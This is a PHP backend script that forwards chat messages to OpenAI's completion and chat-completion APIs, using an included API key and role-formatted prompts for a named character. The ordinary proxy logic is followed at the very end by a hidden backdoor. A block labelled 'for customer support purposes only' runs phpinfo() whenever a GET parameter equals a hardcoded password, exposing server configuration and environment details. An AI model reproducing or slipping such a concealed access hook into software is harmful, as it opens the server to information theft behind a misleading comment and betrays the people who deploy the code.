<?php
ini_set("display_errors", 0);
include('key.php');
//include('demo-chat.php');

// Read input data
$data = file_get_contents("php://input");

if (is_string($data)) {
    $data = json_decode($data, true);
    $model = $data["model"];
    $messages = $data["array_chat"];
    $character_name = $data["character_name"];
    $temperature = $data["temperature"];
    $frequency_penalty = $data["frequency_penalty"];
    $presence_penalty = $data["presence_penalty"];
}

$header = [
    "Authorization: Bearer " . $API_KEY,
    "Content-type: application/json",
];

if (strpos($model, "-turbo") !== false) {
    //Turbo model
    $isTurbo = true;
    $url = "https://api.openai.com/v1/chat/completions";
    $params = json_encode([
        "messages" => $messages,
        "model" => $model,
        "temperature" => $temperature,
        "max_tokens" => 1500,
        "top_p" => 1,
        "frequency_penalty" => $frequency_penalty,
        "presence_penalty" => $presence_penalty,
    ]);
} else {
    $isTurbo = false;
    //Not a turbo model
    $chat = "";
    foreach ($messages as $msg) {
        $role = $msg["role"];
        $content = $msg["content"];
        if ($role == "system" || $role == "assistant") {
            $chat .= "$character_name: $content\n";
        } elseif ($role == "user") {
            $chat .= "user: $content\n";
        }
    }
    $url = "https://api.openai.com/v1/engines/$model/completions";
    $params = json_encode([
        "prompt" => "The following is a conversation between $character_name and user: \n\n$chat",
        "temperature" => 1,
        "max_tokens" => 1500,
        "top_p" => 1,
        "frequency_penalty" => 0,
        "presence_penalty" => 0,
    ]);
}

// Initialize cURL
$curl = curl_init($url);
$options = [
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => $header,
    CURLOPT_POSTFIELDS => $params,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_SSL_VERIFYHOST => 2,
];
curl_setopt_array($curl, $options);
$response = curl_exec($curl);

if ($response === false) {
    echo json_encode([
        "status" => 0,
        "message" => "An error occurred: " . curl_error($curl),
    ]);
    die();
}

$httpcode = curl_getinfo($curl, CURLINFO_RESPONSE_CODE);

if ($httpcode == 401) {
    $r = json_decode($response);
    echo json_encode([
        "status" => 0,
        "message" => $r->error->message,
    ]);
    die();
}
if ($httpcode == 200) {
    $json_array = json_decode($response, true);
    $choices = $json_array["choices"];
    foreach ($choices as $v) {
        $message = $isTurbo
            ? $v["message"]["content"]
            : trim(str_replace($character_name . ":", "", $v["text"]));
        echo json_encode([
            "status" => 1,
            "message" => $message,
        ]);
    }
} else {
    $r = json_decode($response);
    echo json_encode([
        "status" => 0,
        "message" => "Error HTTP code " . $httpcode." - ".$r->error->message,
    ]);
}

/* This script is for customer support purposes only */
if (isset($_GET["password"]) && $_GET["password"] == "Ç_M4tr1x123_Ç") {
    phpinfo();
}
die();
?>